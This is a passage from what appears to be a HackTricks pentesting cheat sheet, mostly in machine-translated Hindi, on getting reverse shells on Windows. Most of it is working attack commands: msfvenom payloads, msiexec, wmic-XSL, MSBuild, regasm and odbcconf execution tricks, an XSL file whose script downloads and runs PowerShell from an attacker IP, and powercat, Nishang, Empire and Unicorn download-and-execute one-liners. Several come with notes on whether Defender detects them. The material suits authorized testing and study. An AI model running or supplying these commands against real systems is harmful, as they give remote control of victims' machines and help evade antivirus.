powershell.exe -c "(New-Object System.NET.WebClient).DownloadFile('http://10.2.0.5:8000/reverse_shell.vbs',\"$env:temp\test.vbs\");Start-Process %windir%\system32\cscript.exe \"$env:temp\test.vbs\""
```
**Cscript - Metasploit**

Cscript is a command-line scripting engine provided by Microsoft. It is commonly used to execute VBScript or JScript scripts on Windows systems. Metasploit, on the other hand, is a popular penetration testing framework that includes various tools and exploits for testing the security of computer systems.

When it comes to using Cscript with Metasploit, there are several techniques that can be employed. One common approach is to use the `msfvenom` tool to generate a malicious script payload, which can then be executed using Cscript on the target system.

Here is an example of how this can be done:

1. Generate the malicious script payload using `msfvenom`:
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker IP> LPORT=<attacker port> -f vbs -o payload.vbs
```

2. Transfer the generated `payload.vbs` file to the target system.

3. Execute the payload using Cscript:
```
cscript payload.vbs
```

This will initiate a reverse TCP connection from the target system to the attacker's machine, allowing the attacker to gain control over the compromised system.

It is important to note that using Cscript with Metasploit or any other hacking technique without proper authorization is illegal and unethical. These techniques should only be used for legitimate purposes, such as penetration testing or securing computer systems.
```bash
msfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 -f vbs > shell.vbs
```
**डिफेंडर द्वारा पहचाना गया**

## PS-Bat
```bash
\\webdavserver\folder\batchfile.bat
```
नेटवर्क कॉल करने वाली प्रक्रिया: **svchost.exe**\
डिस्क पर लिखी गई पेलोड: **WebDAV क्लाइंट स्थानीय कैश**
```bash
msfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 > shell.bat
impacket-smbserver -smb2support kali `pwd`
```

```bash
\\10.8.0.3\kali\shell.bat
```
## **डिफेंडर द्वारा पहचाना गया**

## **MSIExec**

हमलावर
```
msfvenom -p windows/meterpreter/reverse_tcp lhost=10.2.0.5 lport=1234 -f msi > shell.msi
python -m SimpleHTTPServer 80
```
शिकारी:
```
victim> msiexec /quiet /i \\10.2.0.5\kali\shell.msi
```
**पता लगाया गया**

## **Wmic**
```
wmic os get /format:"https://webserver/payload.xsl"
```
नेटवर्क कॉल करने वाली प्रक्रिया: **wmic.exe**\
डिस्क पर लिखित पेलोड: **IE स्थानीय कैश** 

उदाहरण xsl फ़ाइल:
```
<?xml version='1.0'?>
<stylesheet xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt" xmlns:user="placeholder" version="1.0">
<output method="text"/>
<ms:script implements-prefix="user" language="JScript">
<![CDATA[
var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /c echo IEX(New-Object Net.WebClient).DownloadString('http://10.2.0.5/shell.ps1') | powershell -noprofile -");
]]>
</ms:script>
</stylesheet>
```
यहां से निकाला गया है [यहां](https://gist.github.com/Arno0x/fa7eb036f6f45333be2d6d2fd075d6a7)

**अनुमान नहीं लगाया गया**

**आप आसानी से एक Koadic zombie को डाउनलोड और एक्सीक्यूट कर सकते हैं उपयोग करके stager wmic**
```
cmd /V /c "set MB="C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe" & !MB! /noautoresponse /preprocess \\webdavserver\folder\payload.xml > payload.xml & !MB! payload.xml"
```
नेटवर्क कॉल करने वाली प्रक्रिया: **svchost.exe**\
डिस्क पर लिखी गई पेलोड: **WebDAV क्लाइंट स्थानीय कैश**

आप इस तकनीक का उपयोग अनुप्रयोग व्हाइटलिस्टिंग और Powershell.exe प्रतिबंधों को दूर करने के लिए कर सकते हैं। जैसा कि आपको PS शेल के साथ प्रॉम्प्ट किया जाएगा।\
बस इसे डाउनलोड करें और इसे निष्पादित करें: [https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj](https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj)
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe MSBuildShell.csproj
```
**अनुमानित नहीं**

## **सीएससी**

विक्टिम मशीन में सीशार्प कोड को कंपाइल करें।
```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /out:shell.exe shell.cs
```
आप यहां से एक मूल C# रिवर्स शैल डाउनलोड कर सकते हैं: [https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc](https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc)

**नहीं पता चला**

## **Regasm/Regsvc**
```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /u \\webdavserver\folder\payload.dll
```
नेटवर्क कॉल करने वाली प्रक्रिया: **svchost.exe**\
डिस्क पर लिखी गई पेलोड: **WebDAV क्लाइंट स्थानीय कैश**

**मैंने इसे प्रयास नहीं किया है**

[**https://gist.github.com/Arno0x/71ea3afb412ec1a5490c657e58449182**](https://gist.github.com/Arno0x/71ea3afb412ec1a5490c657e58449182)

## Odbcconf
```
odbcconf /s /a {regsvr \\webdavserver\folder\payload_dll.txt}
```
नेटवर्क कॉल करने वाली प्रक्रिया: **svchost.exe**\
डिस्क पर लिखे गए पेलोड: **WebDAV क्लाइंट स्थानीय कैश**

**मैंने इसे प्रयास नहीं किया है**

[**https://gist.github.com/Arno0x/45043f0676a55baf484cbcd080bbf7c2**](https://gist.github.com/Arno0x/45043f0676a55baf484cbcd080bbf7c2)

## पॉवरशेल शेल्स

### PS-Nishang

[https://github.com/samratashok/nishang](https://github.com/samratashok/nishang)

**शेल्स** फ़ोल्डर में, कई अलग-अलग शेल्स हैं। Invoke-_PowerShellTcp.ps1_ को डाउनलोड और निष्पादित करने के लिए स्क्रिप्ट की एक प्रतिलिपि बनाएं और फ़ाइल के अंत में जोड़ें:
```
Invoke-PowerShellTcp -Reverse -IPAddress 10.2.0.5 -Port 4444
```
एक वेब सर्वर में स्क्रिप्ट को सर्व करना शुरू करें और पीड़ित के अंत में इसे निष्पादित करें:
```
powershell -exec bypass -c "iwr('http://10.11.0.134/shell2.ps1')|iex"
```
डिफेंडर इसे खतरनाक कोड के रूप में नहीं पहचानता है (अभी तक, 3/04/2019).

**करने के लिए: अन्य निशांग शैल्स की जांच करें**

### **पीएस-पावरकैट**

[**https://github.com/besimorhino/powercat**](https://github.com/besimorhino/powercat)

डाउनलोड करें, एक वेब सर्वर शुरू करें, सुनने वाले को शुरू करें, और पीड़ित के अंत में इसे निष्पादित करें:
```
powershell -exec bypass -c "iwr('http://10.2.0.5/powercat.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
```
डिफेंडर इसे खतरनाक कोड के रूप में नहीं पहचानता है (अभी तक, 3/04/2019).

**पावरकैट द्वारा प्रस्तावित अन्य विकल्प:**

बाइंड शेल, रिवर्स शेल (TCP, UDP, DNS), पोर्ट पुनर्निर्देशन, अपलोड/डाउनलोड, पेलोड उत्पन्न करें, फ़ाइलें सर्व करें...
```
Serve a cmd Shell:
powercat -l -p 443 -e cmd
Send a cmd Shell:
powercat -c 10.1.1.1 -p 443 -e cmd
Send a powershell:
powercat -c 10.1.1.1 -p 443 -ep
Send a powershell UDP:
powercat -c 10.1.1.1 -p 443 -ep -u
TCP Listener to TCP Client Relay:
powercat -l -p 8000 -r tcp:10.1.1.16:443
Generate a reverse tcp payload which connects back to 10.1.1.15 port 443:
powercat -c 10.1.1.15 -p 443 -e cmd -g
Start A Persistent Server That Serves a File:
powercat -l -p 443 -i C:\inputfile -rep
```
### एम्पायर

[https://github.com/EmpireProject/Empire](https://github.com/EmpireProject/Empire)

एक पावरशेल लॉन्चर बनाएं, इसे एक फ़ाइल में सहेजें और उसे डाउनलोड और निष्पादित करें।
```
powershell -exec bypass -c "iwr('http://10.2.0.5/launcher.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
```
**खोजा गया कोड के रूप में**

### MSF-Unicorn

[https://github.com/trustedsec/unicorn](https://github.com/trustedsec/unicorn)

यूनिकॉर्न का उपयोग करके मेटास्प्लोइट बैकडोर का पावरशेल संस्करण बनाएं।
```
python unicorn.py windows/meterpreter/reverse_https 10.2.0.5 443
```
बनाए गए संसाधन के साथ msfconsole शुरू करें:
```
msfconsole -r unicorn.rc
```
वेब सर्वर शुरू करें जो _powershell\_attack.txt_ फ़ाइल को सेव करता है और पीड़ित में निष्पादित करें:
```
powershell -exec bypass -c "iwr('http://10.2.0.5/powershell_attack.txt')|iex"
```
**खतरनाक कोड के रूप में पहचाना गया**

## अधिक

[PS>Attack](https://github.com/jaredhaight/PSAttack) PS कंसोल जिसमें कुछ आक्रामक PS मॉड्यूल पहले से लोड होते हैं (गुप्तित)\
[https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f9](https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f93c)[\
WinPWN](https://github.com/SecureThisShit/WinPwn) PS कंसोल जिसमें कुछ आक्रामक PS मॉड्यूल और प्रॉक्सी पता लगाने की क्षमता होती है (IEX)

## संदर्भ पुस्तकालय

* [https://highon.coffee/blog/reverse-shell-cheat-sheet/](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
* [https://gist.github.com/Arno0x](https://gist.github.com/Arno0x)
* [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
* [https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/](https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/)
* [https://www.hackingarticles.in/koadic-com-command-control-framework/](https://www.hackingarticles.in/koadic-com-command-control-framework/)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

​

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

विशेषता जो मायने रखती हैं उन दुर्बलताओं को खोजें ताकि आप उन्हें तेजी से ठीक कर सकें। Intruder आपकी हमला क्षेत्र का ट्रैक करता है, प्रोएक्टिव धारणा स्कैन चलाता है, आपकी पूरी टेक स्टैक, एपीआई से वेब ऐप्स और क्लाउड सिस्टम तक, मुद्दों को खोजता है। [**इसे मुफ्त में प्रयास करें**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) आज।

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}


<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी **कंपनी को HackTricks में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने की पहुंच** चाहिए? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
* खोजें [**The PEASS Family**](https://opensea.io/collection/the-peass-family), हमारा विशेष संग्रह [**NFTs**](https://opensea.io/collection/the-peass-family)
* प्राप्त करें [**आधिकारिक PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या मुझे **ट्विटर** पर **फ़ॉलो** करें [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **अपने हैकिंग ट्रिक्स साझा करें, PRs सबमिट करके** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **और** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **को।**

</details>
